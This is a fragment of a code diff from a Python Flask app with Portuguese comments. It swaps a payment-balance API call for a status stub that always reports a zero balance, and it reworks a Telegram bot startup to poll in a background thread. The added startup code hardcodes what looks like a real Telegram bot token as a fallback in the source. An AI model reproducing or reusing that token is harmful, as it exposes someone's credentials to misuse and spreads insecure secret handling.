-    api_key = row_key["value"] if row_key and row_key["value"] else os.environ.get("C7_API_KEY", get_secure_c7_key())
-    
-    if api_key and _REQUESTS_OK:
-        try:
-            hdrs = {
-                "Authorization": f"Bearer {api_key}",
-                "User-Agent": "Mozilla/5.0"
-            }
-            resp = _req.get("https://api.carteirado7.com/v2/account/balance", headers=hdrs, timeout=5)
-            if resp.status_code == 200:
-                data = resp.json()
-                balance = data.get("balance", data.get("amount", 0))
-                return jsonify({"ok": True, "balance": balance})
-        except:
-            pass
-    return jsonify({"ok": False, "balance": 0})
+    row_key = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
+    has_key = bool(os.environ.get("UNIAOPAY_API_KEY") or (row_key and row_key["value"]))
+    return jsonify({
+        "ok": True,
+        "gateway": "Uniao 7 Pay",
+        "status": "ONLINE" if has_key else "AGUARDANDO CHAVE",
+        "configured": has_key,
+        "balance": 0
+    })
 
 @app.route("/api/supreme/frete", methods=["POST"])
 @supreme_required
@@ -2230,14 +2307,39 @@ def too_many(_):
 #  BOOT E BOT BACKGROUND
 # ══════════════════════════════════════════════════════════════════════════════
 def start_bot():
+    """Inicia polling do bot do Telegram em thread daemon para garantir que o bot fique ativo e movimentado."""
     try:
         import bot
-        if bot.BOT_TOKEN and bot.BOT_TOKEN != "SEU_TOKEN_AQUI":
-            # Em Serverless (Vercel), polling não funciona. Vamos apenas ignorar.
-            # O Webhook será ativado manualmente via /set-webhook
-            log.info("Bot rodará via Webhook.")
+        token = bot.BOT_TOKEN
+        if not token or token == "SEU_TOKEN_AQUI":
+            token = os.environ.get("TELEGRAM_BOT_TOKEN") or "8390380990:AAGeDvwbsOz7cHXBy22y0vbR4V6DOEFzeA8"
+            bot.BOT_TOKEN = token
+            bot.bot.token = token
+            
+        if token and token != "SEU_TOKEN_AQUI":
+            import threading
+            # Se não for ambiente restrito serverless Vercel, inicia infinity_polling em daemon thread
+            is_vercel = os.environ.get("VERCEL") == "1"
+            if not is_vercel:
+                try:
+                    bot.bot.remove_webhook()
+                except Exception as _e_wh:
+                    log.warning("[BOT] remove_webhook aviso: %s", _e_wh)
+
+                def _poll():
+                    log.info("[BOT] Telegram Bot Polling ATIVADO e MOVIMENTADO (Token: %s...)", token[:10])
+                    try:
+                        bot.bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=20)
+                    except Exception as _pe:
+                        log.error("[BOT] Polling erro: %s", _pe)
+
+                t = threading.Thread(target=_poll, daemon=True, name="TelegramBotPolling")
+                t.start()
+                log.info("[BOT] Thread de polling do Telegram iniciada com sucesso.")
+            else:
+                log.info("[BOT] Ambiente Vercel detectado: bot configurado para responder via webhook.")
     except Exception as e:
-        log.error("Falha ao configurar bot: %s", e)
+        log.error("Falha ao iniciar bot: %s", e)
 
 # Webhook Handler
 @app.route('/telegram-webhook', methods=['POST'])
